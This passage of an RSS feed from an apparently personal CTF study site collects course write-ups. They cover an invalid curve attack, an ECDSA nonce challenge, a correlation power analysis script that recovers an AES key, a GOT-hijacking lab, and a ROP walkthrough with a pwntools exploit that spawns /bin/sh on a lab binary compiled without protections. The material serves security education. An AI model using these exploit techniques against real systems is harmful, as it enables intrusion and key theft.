# ct = 10016669153906644953016660527326048255337800602435656916304698358749910229624738375584073093905785564737742726549033330343901680652357648652891913260149958947299067801907769873568759955053120633017158582128001396334187309835478967775943564724073809481988489791896725867047366927584419210464759674986336704398037888892734158765679221980466827060998749130113847401820986980535379266905587107992796676977541915779320084736207068268591500847603252838325486939367980604888710370629644796971859833251926677637185722683564847418746350226830775205063128441515048529918173084258483536354002888691012853231754416802134513394608
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x11(2023 HW - invalid_curve_attack)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x112023-hw---invalid_curve_attack/</guid><description>&lt;h1 id="simple-crypto-0x112023-hw---invalid_curve_attack">
 Simple Crypto 0x11(2023 HW - invalid_curve_attack)
 &lt;a class="anchor" href="#simple-crypto-0x112023-hw---invalid_curve_attack">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/maple3142/My-CTF-Challenges/blob/7d9141ac7b61fdbb71f29c07d489018d7c0a0aaa/AIS3%20Pre-exam%202022/pekobot/README.md">pekobot - maple&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>這邊我會嘗試用簡單的講法把這個攻擊簡述一遍，詳細還是建議 &lt;a href="https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md">Crypton&lt;/a> 或是其他地方的說明。&lt;/p>
&lt;p>Invalid Curve Attack 大致上來說利用的是當一個不在原本曲線 $E$ 上的 $P$ 進行 scalar multiplication 的一些特性，使用類似 &lt;a href="https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm">Pohlig–Hellman algorithm&lt;/a> 的辦法在不同的 subgroup 解 &lt;a href="https://en.wikipedia.org/wiki/Discrete_logarithm">DLP&lt;/a> 然後用 &lt;a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">CRT&lt;/a> 解回原本的 private key。&lt;/p>
&lt;p>一個 Short Weierstrass curve 長這樣:&lt;/p>
&lt;p>$$
y^2 = x^3 + ax + b
$$&lt;/p>
&lt;p>而它的 point doubling formula ($R=2P$) 是:&lt;/p>
&lt;p>$$
\begin{aligned}
s &amp;amp;= \frac{3x_P^2+a}{2y_P} \
x_R &amp;amp;= s^2 - 2x_P \
y_R &amp;amp;= y_P + s(x_R - x_P)
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto 0x12(2023 HW - signature_revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x122023-hw---signature_revenge/</guid><description>&lt;h1 id="simple-crypto-0x122023-hw---signature_revenge">
 Simple Crypto 0x12(2023 HW - signature_revenge)
 &lt;a class="anchor" href="#simple-crypto-0x122023-hw---signature_revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Skf4o1tGp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/B16No1FzT.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> hashlib &lt;span style="color:#f92672">import&lt;/span> sha256, md5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa &lt;span style="color:#f92672">import&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> ecdsa.ecdsa &lt;span style="color:#f92672">import&lt;/span> Public_key, Private_key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>E &lt;span style="color:#f92672">=&lt;/span> SECP256k1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>G, n &lt;span style="color:#f92672">=&lt;/span> E&lt;span style="color:#f92672">.&lt;/span>generator, E&lt;span style="color:#f92672">.&lt;/span>order
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> bytes_to_long( os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)) &lt;span style="color:#f92672">+&lt;/span> FLAG )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pubkey &lt;span style="color:#f92672">=&lt;/span> Public_key(G, d&lt;span style="color:#f92672">*&lt;/span>G)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>prikey &lt;span style="color:#f92672">=&lt;/span> Private_key(pubkey, d)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic1 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>))&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>magic2 &lt;span style="color:#f92672">=&lt;/span> md5(d&lt;span style="color:#f92672">.&lt;/span>to_bytes(&lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;big&amp;#34;&lt;/span>)[::&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h1 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=IBnrn2pnPG8&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h2 &lt;span style="color:#f92672">=&lt;/span> sha256(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=1H2cyhWYXrE&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>digest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k1 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic1 &lt;span style="color:#f92672">+&lt;/span> magic2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k2 &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(magic2 &lt;span style="color:#f92672">+&lt;/span> magic1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig1 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h1), k1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sig2 &lt;span style="color:#f92672">=&lt;/span> prikey&lt;span style="color:#f92672">.&lt;/span>sign(bytes_to_long(h2), k2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;P = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>x()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>pubkey&lt;span style="color:#f92672">.&lt;/span>point&lt;span style="color:#f92672">.&lt;/span>y()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig1 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig1&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig2 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x13(2023 HW - Power Analysis)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</guid><description>&lt;h1 id="simple-crypto-0x132023-hw---power-analysis">
 Simple Crypto 0x13(2023 HW - Power Analysis)
 &lt;a class="anchor" href="#simple-crypto-0x132023-hw---power-analysis">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/Q-gaGLJpJHc?si=DZgJm62AnoPHWiZF&amp;amp;t=5433"> [edu-ctf 2023] week04 - crypto3 [1:30:36]&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>json file recorded by TA&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:&lt;/p>
&lt;ol>
&lt;li>Preprocessing
也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起&amp;hellip;)&lt;/li>
&lt;li>計算和sbox key XOR的結果&lt;/li>
&lt;li>查表sbox&lt;/li>
&lt;li>計算hamming weight model&lt;/li>
&lt;li>計算和trace的correlation coefficient&lt;/li>
&lt;li>看哪一個結果的數值最大，並把index結果記錄下來算它的ascii&lt;/li>
&lt;li>repeat以上操作後共可得16 bytes的flag&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>加速的方法:
可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import json
from tqdm import trange
import numpy as np
import copy
from string import ascii_letters, digits
from numpy import corrcoef

jsonFile = open(&amp;#39;./Crypto/HW3/traces.json&amp;#39;, &amp;#39;r&amp;#39;)
j = json.load(jsonFile)

s_box = [
 [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76],
 [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0],
 [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15],
 [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75],
 [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84],
 [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF],
 [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8],
 [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2],
 [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73],
 [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB],
 [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79],
 [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08],
 [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A],
 [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E],
 [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF],
 [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
]

def data_preprocess(json_data):
 pt_col = []
 ct_col = []
 trace_col = []
 for bytes in range(16):
 tmp_pt_col = []
 tmp_ct_col = []
 for trace_idx in range(len(json_data)):
 tmp_pt_col.append(json_data[trace_idx][&amp;#39;pt&amp;#39;][bytes])
 tmp_ct_col.append(json_data[trace_idx][&amp;#39;ct&amp;#39;][bytes])
 pt_col.append(tmp_pt_col)
 ct_col.append(tmp_ct_col)
 for point in range(len(json_data[0][&amp;#39;pm&amp;#39;])):
 tmp_trace_col = []
 for trace_idx in range(len(json_data)):
 tmp_trace_col.append(json_data[trace_idx][&amp;#39;pm&amp;#39;][point])
 trace_col.append(tmp_trace_col)
 
 return pt_col, ct_col, trace_col

def sbox_preprocess(pt_col):
 sbox_result_tmp = []
 for sbox_key in range(256): # 總共有256個sbox key
 tmp = []
 for trace in range(len(pt_col)): # 有50個trace
 tmp.append(pt_col[trace] ^ sbox_key)
 sbox_result_tmp.append(tmp)
 return sbox_result_tmp

def choose_sbox(sbox_result_tmp):
 sbox_result = copy.deepcopy(sbox_result_tmp)
 for sbox_key in range(256):
 for trace in range(50):
 hex_value = &amp;#39;{0:0&amp;gt;2x}&amp;#39;.format(sbox_result_tmp[sbox_key][trace])
 x, y = hex_value[0], hex_value[1]
 sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)]
 
 return sbox_result

def cal_hamming_weight(sbox_result_col):
 hw_model = copy.deepcopy(sbox_result_col)
 for i in range(len(sbox_result_col)): # 256
 for j in range(len(sbox_result_col[i])): # 50
 hw_model[i][j] = bin(sbox_result_col[i][j]).count(&amp;#39;1&amp;#39;)
 
 return hw_model

def cal_correlation(hw_model_col_result, trace_col):
 correlation_result = []
 for i in (ascii_letters + digits).encode():#trange(len(hw_model_col_result)): &amp;lt;- 加速的部分
 for j in range(biggest_length):
 correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1])
 return correlation_result
 
def run_pearson_correlation(x, y):
 mean_x = np.mean(x)
 mean_y = np.mean(y)
 
 covariance = np.sum((x - mean_x) * (y - mean_y))
 
 std_dev_x = np.sqrt(np.sum((x - mean_x)**2))
 std_dev_y = np.sqrt(np.sum((y - mean_y)**2))
 
 correlation = covariance / (std_dev_x * std_dev_y)
 
 return correlation

def display_pt(offset:int, data_offset = (0, len(j[0][&amp;#34;pm&amp;#34;]))):
 plt.plot(range(data_offset[0], data_offset[1]), j[offset][&amp;#34;pm&amp;#34;][data_offset[0]:data_offset[1]])
 plt.savefig(fname=&amp;#34;pt_&amp;#34; + str(offset) + &amp;#34;.jpg&amp;#34;)
 plt.clf()

# display_pt(0, (0, 95))
# display_pt(0)
pt_col, ct_col, trace_col = data_preprocess(j)
flag = &amp;#39;&amp;#39;
biggest_length = 95# len(trace_col)
for idx in trange(16):
 sbox_preprocess_result = sbox_preprocess(pt_col[idx])
 choose_sbox_result = choose_sbox(sbox_preprocess_result)
 hw_model_col_result = cal_hamming_weight(choose_sbox_result)
 correlation_result = cal_correlation(hw_model_col_result, trace_col)
 key_idx = correlation_result.index(max(correlation_result))
 flag += (ascii_letters + digits)[key_idx // biggest_length]
 # from Crypto.Util.number import long_to_bytes
 # flag += long_to_bytes(key_idx // biggest_length).decode(&amp;#34;cp437&amp;#34;)

print(&amp;#39;The key of AES is: FLAG{&amp;#39; + flag + &amp;#39;}&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>有嘗試過只選擇常見可使用的字元也就是&lt;code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&lt;/code>，以及trace只選擇前95個data，也可以正常解析出AES key並且算的更快(大約快77倍左右)&lt;/p></description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</guid><description>&lt;h1 id="simple-pwn---0x06got-hijackinglab---got2win">
 Simple PWN - 0x06(GOT hijacking/Lab - &lt;code>got2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x06got-hijackinglab---got2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="got-background">
 GOT Background
 &lt;a class="anchor" href="#got-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=4423">Lecture Vid. - Pwn week1&lt;/a>
&lt;a href="https://youtu.be/PBgHHWtjtFA?t=6017">NTUSTISC - Pwn Basic 2 [2019.03.19]&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x30];

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 int fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 read(fd, flag, 0x30);
 close(fd);
 write(1, &amp;#34;Good luck !\n&amp;#34;, 13);

 unsigned long addr = 0;
 printf(&amp;#34;Overwrite addr: &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;addr);
 printf(&amp;#34;Overwrite 8 bytes value: &amp;#34;);
 read(0, (void *) addr, 0x8);

 printf(&amp;#34;Give me fake flag: &amp;#34;);
 int nr = read(1, flag, 0x30);
 if (nr &amp;lt;= 0)
 exit(1);
 flag[nr - 1] = &amp;#39;\0&amp;#39;;
 printf(&amp;#34;This is your flag: ctf{%s}... Just kidding :)\n&amp;#34;, flag);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</guid><description>&lt;h1 id="simple-pwn---0x07rop">
 Simple PWN - 0x07(ROP)
 &lt;a class="anchor" href="#simple-pwn---0x07rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is very similar to normal &lt;code>BOF&lt;/code>.&lt;/li>
&lt;li>If a sample code that doesn&amp;rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.&lt;/li>
&lt;li>Therefore, the main idea is use some &lt;code>&amp;lt;operation&amp;gt;;ret&lt;/code> pattern segment to overlap stack.
&lt;img src="https://imgur.com/YGarADK.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-c!=1" data-lang="c!=1">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0)
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Here is your \&amp;#34;/bin/sh\&amp;#34;: %p\n&amp;#34;, &amp;#34;/bin/sh&amp;#34;);
 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x400);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>At line &lt;code>11&lt;/code>, &lt;code>%p&lt;/code> means pointer of &lt;code>/bin/sh&lt;/code> string.&lt;/li>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection. In addition, please use &lt;code>-static&lt;/code> command to compile library at compile time, so that we can get &lt;code>ROP gadget&lt;/code> more easily.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use &lt;code>ROP gadget&lt;/code> to construct chain.&lt;/li>
&lt;li>Second, we use &lt;code>ROPgadget&lt;/code> to find suitable gadget
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --multibr --binary rop &amp;gt; rop_gadget
$ vim rop_gadget
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/IzeTvgK.png" alt="" />
&lt;img src="https://imgur.com/PlA5C8B.png" alt="" />
&lt;img src="https://imgur.com/zg28Pti.png" alt="" />
&lt;img src="https://imgur.com/WDS0HUh.png" alt="" />
&lt;img src="https://imgur.com/dEh7b5n.png" alt="reference link" />
&lt;ul>
&lt;li>Note that, you may consider that &lt;code>pop rdx ; pop rbx ; ret&lt;/code> is not what we want. We just want &lt;code>pop rdx ; ret&lt;/code>. Therefore, we have to push one more value for &lt;code>pop rbx ;&lt;/code> instruction.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we can construct our payload:
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./rop&amp;#39;)

r.recvuntil(&amp;#39;Here is your &amp;#34;/bin/sh&amp;#34;: &amp;#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&amp;#34;binsh: {hex(binsh)}&amp;#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, &lt;code>r.recvline()[:-1]&lt;/code> is &lt;code>b'0x498004'&lt;/code> and we must pop to &lt;code>%rdi&lt;/code> at line &lt;code>17&lt;/code> below.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then we can combine them together using &lt;a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat">flat method&lt;/a>. It&amp;rsquo;ll flat the address with &lt;strong>length 8 bytes&lt;/strong>.
&lt;pre tabindex="0">&lt;code class="language-python!=16" data-lang="python!=16">ROP = flat(
 pop_rdi_ret, binsh,
 pop_rsi_ret, 0,
 pop_rdx_ret, 0, 0,
 pop_rax_ret, 0x3b,
 syscall,
)

gdb.attach(r)
r.sendafter(&amp;#34;Give me your ROP: &amp;#34;, b&amp;#39;a&amp;#39; * 0x18 + ROP)

r.interactive()
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/dk0Z2mw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is totally the same as our hypothesis.
&lt;img src="https://imgur.com/OjcDNbu.png" alt="" />&lt;/li>
&lt;li>We can see that all parameters are ready
&lt;img src="https://imgur.com/xXx7HRQ.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</guid><description>&lt;h1 id="simple-pwn---0x08one_gadget-with-rop">
 Simple PWN - 0x08(one_gadget with ROP)
 &lt;a class="anchor" href="#simple-pwn---0x08one_gadget-with-rop">#&lt;/a>
